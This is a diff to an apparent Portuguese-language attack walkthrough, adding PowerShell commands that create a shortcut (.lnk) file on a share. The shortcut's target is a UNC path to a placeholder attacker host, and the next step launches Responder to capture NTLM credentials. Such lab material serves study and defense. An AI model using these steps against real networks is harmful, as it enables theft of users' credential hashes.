@@ -58,8 +58,16 @@ while ($true) {
 ## Attack
 
 - Criacao do .lnk
-<img width="1360" height="217" alt="ipblur" src="https://github.com/user-attachments/assets/1ec37377-4801-4f02-8f85-888ef5315d1b" />
-
+```
+PS C:\Users\pparker\Downloads> $objShell = New-Object -ComObject WScript.shell
+PS C:\Users\pparker\Downloads> $lnk = $objShell.CreateShortcut("C:\Shares\test.lnk")
+PS C:\Users\pparker\Downloads> $lnk.TargetPath = "\\IP_ATACANTE\"
+PS C:\Users\pparker\Downloads> $lnk.WindowStyle = 1
+PS C:\Users\pparker\Downloads> $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+PS C:\Users\pparker\Downloads> $lnk.Description = "Test" 
+PS C:\Users\pparker\Downloads> $lnk.HotKey = "Ctrl+Alt+T"
+PS C:\Users\pparker\Downloads> $lnk.Save()  
+```
 - Iniciar Responder
   <img width="619" height="675" alt="r3" src="https://github.com/user-attachments/assets/f2e110f7-0504-40c5-98e9-43d93e08f412" />
 
@@ -87,6 +95,7 @@ while ($true) {
 
 
   
+
 
 
 
